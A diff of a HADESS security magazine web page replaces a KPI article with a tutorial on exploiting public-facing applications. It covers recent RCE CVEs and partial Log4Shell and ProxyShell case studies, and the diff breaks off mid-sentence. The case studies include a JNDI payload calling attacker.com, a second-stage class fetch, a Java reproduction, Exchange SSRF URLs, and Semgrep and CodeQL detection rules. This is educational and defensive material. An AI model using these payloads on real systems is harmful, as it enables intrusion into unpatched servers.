@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/attacked-from-behind-application#article","headline":"Attacked From Behind Application — HADESS Magazine","description":"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause...","url":"https://hadesssecurity.github.io/blog/read/attacked-from-behind-application","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/attacked-from-behind-application"},"datePublished":"July 22, 2022","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/07/stan-brown-rendernew.jpeg"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/attacked-from-behind-application#article","headline":"Attacked From Behind Application — HADESS Magazine","description":"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause...","url":"https://hadesssecurity.github.io/blog/read/attacked-from-behind-application","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/attacked-from-behind-application"},"datePublished":"July 22, 2022","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/07/stan-brown-rendernew.jpeg"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,11 +1550,415 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2022/07/stan-brown-rendernew.jpeg">
       
-<p class="wp-block-paragraph">Organizations across various domains—ranging from traditional IT security to AI-driven initiatives—are turning to Key Performance Indicators (KPIs) to measure progress and ensure sustainable results. Through the SMART framework, each KPI is crafted to be Specific, Measurable, Achievable, Relevant, and Time-Bound, enabling teams to focus on precise outcomes like minimizing detection time, improving patch compliance, and raising awareness through targeted security training. Real-world examples—from ShieldCore’s SOC transformation to DevOps-driven improvements at BetaWorks and AI model security at AlphaVision—underscore how these metrics reduce risks, streamline incident response, and bolster regulatory adherence.</p>
+<p class="wp-block-paragraph">Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.</p>
 
 
 
-<p class="wp-block-paragraph">Across all these cases, core KPIs consistently monitor early threat detection, timely response, comprehensive coverage of system defenses, and the recurrence of specific security incidents. By tracking these measurements in cloud-focused, DevOps, AI, or traditional environments, organizations uncover vulnerabilities, optimize resources, and adopt a proactive stance toward safeguarding data and infrastructure. This unified approach to KPI-driven improvements delivers tangible accountability and ongoing governance, ensuring that security initiatives remain aligned with strategic business goals.</p>
+<p class="wp-block-paragraph">Some of the most significant and most dangerous vulnerabilities and the attacks they have enabled have involved using RCE for Exploit Public-Facing Application.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-what-is-rce">What is RCE</h1>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://lh4.googleusercontent.com/WBAH4h9R82iqj9fu0zY6S16ISzZo0ApoHcwj_izYxgbLYjuLnLddxaIeOWbEJAWeatYefEZfruHeq_ituS8lqSXV9-M9yFKAJ3geiSBu4-nrdgA0zKn8WPRjsuts_Sdbveg1tIuxwzbObwVIQb1mE2g" alt="" /></figure>
+
+
+
+<p class="wp-block-paragraph">A remote code execution (RCE) vulnerability occurs when an application uses user-controlled input without sanitizing it.</p>
+
+
+
+<p class="wp-block-paragraph">RCE is typically exploited in one of two ways. The first is by executing shell commands. The second is by executing functions in the programming language that the vulnerable application uses or relies on.</p>
+
+
+
+<p class="wp-block-paragraph">The impact of an RCE vulnerability can range from malware execution to an attacker gaining full control over a compromised machine.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-history-of-rce">History of RCE&nbsp;</h1>
+
+
+
+<p class="wp-block-paragraph">Last year RCE Vulnerability in fire…</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://lh6.googleusercontent.com/Ktyw9NF9kZ4_Thyo67SedkxP0C55wvGxP6C58d7ZJdiw85D9pMGQBWR5cpqBqCntJdIbxYHA4wjJLg_Wn6VuxXiuf1xI4UVJkYb8aKu9rpDPaujuiJe0xueQdN6lZDFyw8ykUqajdc4f0Kat0upy9lo" alt="" title="Points scored" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>ProxyLogon &#8211; CVE-2021-26855-8&nbsp;</strong></p>
+
+
+
+<p class="wp-block-paragraph">These vulnerabilities, known as ProxyLogon, affect Microsoft Exchange email servers. Successful exploitation of these vulnerabilities in combination (i.e., “vulnerability chaining”) allows an unauthenticated cyber actor to execute arbitrary code on vulnerable Exchange Servers, which, in turn, enables the actor to gain persistent access to files and mailboxes on the servers, as well as to credentials stored on the servers. Successful exploitation may additionally enable the cyber actor to compromise trust and identity in a vulnerable network.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>ProxyShell &#8211; CVE-2021-34473-34523-31207</strong></p>
+
+
+
+<p class="wp-block-paragraph">ProxyShell is a set of three security flaws (CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207) which, when used together, could enable a threat actor to perform unauthenticated, remote code execution (RCE) on unpatched Microsoft Exchange servers.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Log4j &#8211; CVE-2021-4104</strong></p>
+
+
+
+<p class="wp-block-paragraph">JMSAppender in Log4j 1.2 is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration. The attacker can provide TopicBindingName and TopicConnectionFactoryBindingName configurations causing JMSAppender to perform JNDI requests that result in remote code execution in a similar fashion to CVE-2021-44228.&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>CVE-2021-21972</strong></p>
+
+
+
+<p class="wp-block-paragraph">The vSphere Client (HTML5) contains a remote code execution vulnerability in a vCenter Server plugin. VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>CVE-2021-26084</strong></p>
+
+
+
+<p class="wp-block-paragraph">An OGNL injection vulnerability exists that allows an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>CVE-2021-2109</strong></p>
+
+
+
+<p class="wp-block-paragraph">Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console) that could be RCE via JNDI</p>
+
+
+
+<p class="wp-block-paragraph"><strong>CVE-2021-40539</strong></p>
+
+
+
+<p class="wp-block-paragraph">Zoho ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution.</p>
+
+
+
+<h1 class="wp-block-heading" id="h-case-study">Case Study</h1>
+
+
+
+<h2 class="wp-block-heading" id="h-log4shell-partially">Log4Shell(Partially)</h2>
+
+
+
+<p class="wp-block-paragraph"><strong>Vulnerability Overview</strong></p>
+
+
+
+<p class="wp-block-paragraph">Apache Log4j2 is a Java-based logging tool that rewrites the Log4j framework and introduces a large number of rich features. The logging framework is widely used in business system development to record logs In most cases, developers may write error information caused by user input into the log. Since some functions of Apache Log4j2 have recursive parsing functions, attackers can directly construct malicious requests and trigger remote code execution. line loopholes. This vulnerability does not require special configuration. The Alibaba Cloud security team has verified that Apache Struts2, Apache Solr, Apache Druid, Apache Flink, etc. are all affected. The trigger condition of this vulnerability is that as long as the data input by external users will be logged record, which can cause remote code execution.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Technical Review</strong></p>
+
+
+
+<p class="wp-block-paragraph">Apache Log4j 2 is an excellent Java logging framework. This tool rewrites the Log4j framework and introduces a number of rich features. The log framework is widely used in business system development to record log information.</p>
+
+
+
+<p class="wp-block-paragraph">Due to the recursive parsing function of some functions of Apache Log4j 2, attackers can directly construct malicious requests to trigger remote code execution vulnerabilities.</p>
+
+
+
+<p class="wp-block-paragraph">The official statement of the vulnerability principle is: There is a JNDI injection vulnerability in Apache Log4j2. When the program logs the data entered by the user, this vulnerability can be triggered. Successfully exploiting this vulnerability can execute arbitrary code on the target server.</p>
+
+
+
+<p class="wp-block-paragraph">To put it simply: when printing the log, if your log content contains the keyword ${, the attacker can use the content of the keyword as a variable to replace any attack command and execute it.</p>
+
+
+
+<p class="wp-block-paragraph">Through the JNDI injection vulnerability, hackers can maliciously construct special data request packets to trigger this vulnerability, and then successfully exploit this vulnerability to execute arbitrary code on the target server.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Attack steps</strong></p>
+
+
+
+<ul class="wp-block-list"><li>The attacker sends an attack request to the vulnerable server.</li><li>The server logs the malicious payload based on JNDI and LDAP contained in the attack request through Log4j2 , which is an address controlled by the attacker.${jndi:ldap://attacker.com/a}attacker.com</li><li>The recorded malicious payload is triggered and the server makes a request via JNDI .attacker.com</li><li>attacker.comIt is possible to add some malicious executable scripts to the response and inject them into the server process, such as executable bytecodes http://second-stage.attacker.com/Exploit.class.</li><li>Attacker executes malicious script.</li></ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Vulnerability to reproduce</strong></p>
+
+
+
+<p class="wp-block-paragraph">Pom.xml:</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>&lt;<strong>dependency</strong>&gt;<br>&lt;<strong>groupId</strong>&gt;org.apache.logging.log4j&lt;/<strong>groupId</strong>&gt;<br>&lt;<strong>artifactId</strong>&gt;log4j-core&lt;/<strong>artifactId</strong>&gt;<br>&lt;<strong>version</strong>&gt;2.14.1&lt;/<strong>version</strong>&gt;<br>&lt;/<strong>dependency</strong>&gt;<br>&lt;<strong>dependency</strong>&gt;<br>&lt;<strong>groupId</strong>&gt;org.apache.logging.log4j&lt;/<strong>groupId</strong>&gt;<br>&lt;<strong>artifactId</strong>&gt;log4j-api&lt;/<strong>artifactId</strong>&gt;<br>&lt;<strong>version</strong>&gt;2.14.1&lt;/<strong>version</strong>&gt;<br>&lt;/<strong>dependency</strong>&gt;</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">Main.java:</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>package org. log4js;<br>import org.apache. logging. log4j. LogManager;<br>import org. apache. logging. log4j. Logger;<br>public class Log4jAttack {<br>private static final Logger logger = LogManager-getLogger(Log4jAttack. class);<br>public static void main(String[] args) {<br>logger.error(&#8220;${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y21kLmV4ZSAvYyBjYwxjLmV4Z0==}&#8221;);</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">“Y21kLmV4ZSAvYyBjYwxjLmV4Z0==” == cmd.exe /c calc.exe</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Finding in Source Code:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Semgrep:</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>id: log4j2_tainted_argument<br>patterns:<br>&nbsp; &#8211; pattern-either:<br>&nbsp; &nbsp; &nbsp; &#8211; pattern: (Logger $LOGGER).$METHOD($ARG);<br>&nbsp; &nbsp; &nbsp; &#8211; pattern: (Logger $LOGGER).$METHOD($ARG,&#8230;);<br>&nbsp; &#8211; pattern-inside: |<br>&nbsp; &nbsp; &nbsp; import org.apache.log4j.$PKG;<br>&nbsp; &nbsp; &nbsp; &#8230;<br>&nbsp; &#8211; pattern-not: (Logger $LOGGER).$METHOD(&#8220;&#8230;&#8221;);<br>message: log4j $LOGGER.$METHOD tainted argument<br>languages:<br>&nbsp; &#8211; java<br>severity: WARNING</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">CodeQl</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>/**<br>* @name Log4j Injection<br>* @description Detects log4j calls with user-controlled data.<br>* @kind path-problem<br>* @problem.severity error<br>* @precision high<br>* @id java/log-injection<br>* @tags security<br>* &nbsp; &nbsp; &nbsp; external/cwe/cwe-117<br>*/<br><br>import java<br>import DataFlow::PathGraph<br>import semmle.code.java.dataflow.FlowSources<br><br>class Log4jCall extends MethodAccess {<br>&nbsp; Log4jCall() {<br>&nbsp; &nbsp; exists(RefType t, Method m |<br>&nbsp; &nbsp; &nbsp; t.hasQualifiedName(&#8220;org.apache.log4j&#8221;, [&#8220;Category&#8221;, &#8220;Logger&#8221;, &#8220;LogBuilder&#8221;]) // Log4j v1<br>&nbsp; &nbsp; &nbsp; or<br>&nbsp; &nbsp; &nbsp; t.hasQualifiedName(&#8220;org.apache.logging.log4j&#8221;, [&#8220;Logger&#8221;, &#8220;LogBuilder&#8221;, &#8220;LoggerManager&#8221;]) // Log4j v2 or<br>&nbsp; &nbsp; &nbsp; or<br>&nbsp; &nbsp; &nbsp; t.hasQualifiedName(&#8220;org.apache.logging.log4j.core&#8221;, [&#8220;Logger&#8221;, &#8220;LogBuilder&#8221;, &#8220;LoggerManager&#8221;]) // Log4j v2<br>&nbsp; &nbsp; &nbsp; or<br>&nbsp; &nbsp; &nbsp; t.hasQualifiedName(&#8220;org.apache.logging.log4j.status&#8221;, &#8220;StatusLogger&#8221;) // Log4j Status logger<br>&nbsp; &nbsp; &nbsp; or<br>&nbsp; &nbsp; &nbsp; t.hasQualifiedName(&#8220;org.slf4j&#8221;, [&#8220;Logger&#8221;, &#8220;LoggingEventBuilder&#8221;]) and // SLF4J Logger is used when Log4j core is on classpath<br>&nbsp; &nbsp; &nbsp; log4JJarCoreJarFilePresent()<br>&nbsp; &nbsp; |<br>&nbsp; &nbsp; &nbsp; (<br>&nbsp; &nbsp; &nbsp; &nbsp; m.getDeclaringType().getASourceSupertype*() = t or<br>&nbsp; &nbsp; &nbsp; &nbsp; m.getDeclaringType().extendsOrImplements*(t)<br>&nbsp; &nbsp; &nbsp; ) and<br>&nbsp; &nbsp; &nbsp; m.getReturnType() instanceof VoidType and<br>&nbsp; &nbsp; &nbsp; this = m.getAReference()<br>&nbsp; &nbsp; )<br>&nbsp; }<br><br>&nbsp; Argument getALogArgument() { result = this.getArgument(_) }<br>}<br><br>/**<br>* A taint-tracking configuration for tracking untrusted user input used in log entries.<br>*/<br>private class Log4JInjectionConfiguration extends TaintTracking::Configuration {<br>&nbsp; Log4JInjectionConfiguration() { this = &#8220;Log4j Injection&#8221; }<br><br>&nbsp; override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource }<br><br>&nbsp; override predicate isSink(DataFlow::Node sink) {<br>&nbsp; &nbsp; sink.asExpr() = any(Log4jCall c).getALogArgument()<br>&nbsp; }<br><br>&nbsp; override predicate isSanitizer(DataFlow::Node node) {<br>&nbsp; &nbsp; node.getType() instanceof BoxedType or node.getType() instanceof PrimitiveType<br>&nbsp; }<br>}<br><br>predicate log4JJCoreJarFile(JarFile file) { file.getBaseName().matches(&#8220;%log4j-core%&#8221;) }<br><br>predicate log4JJarCoreJarFilePresent() { log4JJCoreJarFile(_) }<br><br>from Log4JInjectionConfiguration cfg, DataFlow::PathNode source, DataFlow::PathNode sink<br>where cfg.hasFlowPath(source, sink)<br>select sink.getNode(), source, sink, &#8220;$@ flows to log4j call.&#8221;, source.getNode(),<br>&nbsp; &#8220;User-provided value&#8221;</td></tr></tbody></table></figure>
+
+
+
+<h2 class="wp-block-heading" id="h-proxyshell-partially">Proxyshell(Partially)</h2>
+
+
+
+<p class="wp-block-paragraph"><strong>Vulnerability Overview</strong></p>
+
+
+
+<p class="wp-block-paragraph">Using ProxyShell, an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through the exposed port 443.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Technical Review</strong></p>
+
+
+
+<p class="wp-block-paragraph">The vulnerable version of the exchange&#8217;s autodiscover service can be called without authentication and can implement a Microsoft.Exchange.HttpProxy.ProxyRequestHandlerclass. This class can transmit the url that the service needs to access to the backend BackEnd service for the backend to access on its own behalf, and then return the return value to the service. Here is autodiscover.</p>
+
+
+
+<p class="wp-block-paragraph">Under normal circumstances, the target to be accessed is automatically generated by the system service, and it cannot be changed even if we have high authority. If we can change the url transmitted by the service to the backend BackEnd, we can achieve arbitrary url access with high authority.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Attack steps</strong></p>
+
+
+
+<ul class="wp-block-list"><li>The system will determine whether the url of the path part entered by the user ends with autodiscover.json, and if so, assign email (a user&#8217;s controllable parameter) to explicitLogonAddress.</li><li>If the uriend of the user input is not autodiscover.json, delete the same part as the value of email from the beginning of the url input by the user.Then pass this part as the backend to be passed url。</li><li>Therefore, we can construct a similar https://192.168.0.103/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&amp;Email=autodiscover/autodiscover.json%3f@foo.compoc for verification, and the final url passed to the backend is: https://192.168.0.103:444/mapi/nspi/</li></ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Vulnerability to reproduce</strong></p>
+
+
+
+<p class="wp-block-paragraph">Our research found that in some handlers such as EwsAutodiscoverProxyRequestHandler, the email address can be specified through the query string. Since Exchange does full inspection of email addresses, we can access arbitrary backend URLs by scrubbing parts of the URL through the query string during URL normalization.</p>
+
+
+
+<p class="wp-block-paragraph">HttpProxy/EwsAutodiscoverProxyRequestHandler.cs</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>protected override AnchorMailbox ResolveAnchorMailbox() {<br>&nbsp;<br>&nbsp; if (this.skipTargetBackEndCalculation) {<br>&nbsp; &nbsp; &nbsp; base.Logger.Set(3, &#8220;OrgRelationship-Anonymous&#8221;);<br>&nbsp; &nbsp; &nbsp; return new AnonymousAnchorMailbox(this);<br>&nbsp; }<br>&nbsp; if (base.UseRoutingHintForAnchorMailbox) {<br>&nbsp; &nbsp; &nbsp; string text;<br>&nbsp; &nbsp; &nbsp; if (RequestPathParser.IsAutodiscoverV2PreviewRequest(base.ClientRequest.Url.AbsolutePath)) {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text = base.ClientRequest.Params[&#8220;Email&#8221;];<br>&nbsp; &nbsp; &nbsp; } else if (RequestPathParser.IsAutodiscoverV2Version1Request(base.ClientRequest.Url.AbsolutePath)) {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int num = base.ClientRequest.Url.AbsolutePath.LastIndexOf(&#8216;/&#8217;);<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text = base.ClientRequest.Url.AbsolutePath.Substring(num + 1);<br>&nbsp; &nbsp; &nbsp; } else {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text = this.TryGetExplicitLogonNode(0);<br>&nbsp; &nbsp; &nbsp; }<br>&nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; string text2;<br>&nbsp; &nbsp; &nbsp; if (ExplicitLogonParser.TryGetNormalizedExplicitLogonAddress(text, ref text2) &amp;&amp; SmtpAddress.IsValidSmtpAddress(text2))<br>&nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this.isExplicitLogonRequest = true;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this.explicitLogonAddress = text;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&#8230;<br>&nbsp; &nbsp; &nbsp; }<br>&nbsp; }<br>&nbsp; return base.ResolveAnchorMailbox();<br>}<br>protected override UriBuilder GetClientUrlForProxy() {<br>&nbsp; string absoluteUri = base.ClientRequest.Url.AbsoluteUri;<br>&nbsp; string uri = absoluteUri;<br>&nbsp; if (this.isExplicitLogonRequest &amp;&amp; !RequestPathParser.IsAutodiscoverV2Request(base.ClientRequest.Url.AbsoluteUri))<br>&nbsp; {<br>&nbsp; &nbsp; &nbsp; uri = UrlHelper.RemoveExplicitLogonFromUrlAbsoluteUri(absoluteUri, this.explicitLogonAddress);<br>&nbsp; }<br>&nbsp; return new UriBuilder(uri);<br>}</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">From the code snippet above, if the URL passes a check on IsAutodiscoverV2PreviewRequest, the Explicit Logon address can be specified via the Email parameter of the query string. Since the method simply verifies the suffix of the URL, it is easy to specify the address.</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>public static bool IsAutodiscoverV2PreviewRequest(string path) {<br>ArgumentValidator.ThrowIfNull(&#8220;path&#8221;, path);<br>return path.EndsWith(&#8220;/autodiscover.json&#8221;, StringComparison.OrdinalIgnoreCase);<br>}<br>public static bool IsAutodiscoverV2Request(string path) {<br>&nbsp; ArgumentValidator.ThrowIfNull(&#8220;path&#8221;, path);<br>&nbsp; return RequestPathParser.IsAutodiscoverV2Version1Request(path) || RequestPathParser.IsAutodiscoverV2PreviewRequest(path);<br>}</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">The Explicit Logon address is then passed as a parameter to the method RemoveExplicitLogonFromUrlAbsoluteUri, which simply uses the Substring to erase the pattern we specified.</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>public static string RemoveExplicitLogonFromUrlAbsoluteUri(string absoluteUri, string explicitLogonAddress) {<br>&nbsp; ArgumentValidator.ThrowIfNull(&#8220;absoluteUri&#8221;, absoluteUri);<br>&nbsp; ArgumentValidator.ThrowIfNull(&#8220;explicitLogonAddress&#8221;, explicitLogonAddress);<br>&nbsp; string text = &#8220;/&#8221; + explicitLogonAddress;<br>&nbsp; int num = absoluteUri.IndexOf(text);<br>&nbsp; if (num != -1) {<br>&nbsp; &nbsp; &nbsp; return absoluteUri.Substring(0, num) + absoluteUri.Substring(num + text.Length);<br>&nbsp; }<br>&nbsp; return absoluteUri;<br>}</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">We can design the following URLs to abuse the canonicalization process of Explicit Logon URLs:</p>
+
+
+
+<p class="wp-block-paragraph">https://exchange/autodiscover/autodiscover.json?@foo.com/?&amp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Email=autodiscover/autodiscover.json%3f@foo.com</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://lh6.googleusercontent.com/so_4s0Acez_erDSiRStiyamhOShsO-3oB3_pKpAWlOJEFAETHT9c842KnKyz2DKm1O3AXLDfbZMrJ0-4ipu4UzMAPzM_VSymeJhUq9eWX9-pQ7HNPyCJiO0TnL9T0jv_9eMpYizyARJMgh1z0zSJ9Yg" alt="" /></figure>
+
+
+
+<p class="wp-block-paragraph">This problematic URL normalization process allows us to access arbitrary backend URLs when running as the Exchange Server machine account. Although the bug is not as powerful as SSRF in ProxyLogon, and we can only manipulate the path portion of the URL, it is still powerful enough to allow us to perform more attacks with arbitrary backend access.</p>
+
+
+
+<p class="wp-block-paragraph">By https://192.168.0.103/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&amp;Email=autodiscover/autodiscover.json%3f@foo.comaccessing, you can directly access the page, and it is with system</p>
+
+
+
